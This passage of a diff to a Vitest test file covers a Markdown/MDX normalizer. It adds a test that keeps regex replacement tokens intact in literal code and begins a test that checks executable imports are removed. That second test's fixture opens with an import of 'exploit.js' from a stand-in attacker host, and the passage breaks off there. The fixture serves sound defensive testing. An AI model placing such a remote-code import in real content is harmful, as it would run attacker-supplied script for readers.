@@ -2,6 +2,11 @@ import { describe, expect, it } from 'vitest';
 import { normalizePublicMarkdownContent } from './public-markdown-content';
 
 describe('public Markdown content normalization', () => {
+  it.each(['$&', '$$', "$'", '$`'])('preserves replacement metacharacters in literal public code: %s', (token) => {
+    const source = [`Example: \`\`literal ${token}\`\``, '', '~~~mdx', `literal ${token}`, '~~~'].join('\n');
+    expect(normalizePublicMarkdownContent(source)).toBe(source);
+  });
+
   it('projects supported MDX while removing executable imports and raw active HTML', () => {
     const source = `import Exploit from "https://attacker.example/exploit.js"
 
